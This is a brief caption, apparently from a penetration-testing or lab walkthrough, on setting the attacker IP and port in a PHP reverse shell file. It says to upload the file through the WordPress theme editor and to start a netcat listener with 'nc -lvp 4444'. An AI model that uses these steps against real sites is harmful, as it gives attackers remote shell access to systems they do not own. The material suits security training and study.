This screenshot captures the modification of the reverse shell payload in the reverse.php file.

Changes Made:

Set attacker IP:

php
Copy
Edit
$ip = '10.38.1.110';
Set listener port:

php
Copy
Edit
$port = 4444;
Why It Matters:

These are the crucial values that control where the victim system connects back.

Without correctly setting the $ip and $port, the reverse shell would fail to establish.

Next Step:

Upload this file to the target (e.g., via the WordPress theme editor).

Start a listener on the attacker machine:

bash
Copy
Edit
nc -lvp 4444
Takeaway:
Manual editing of payloads ensures theyâ€™re tailored to your current environment and network configuration.
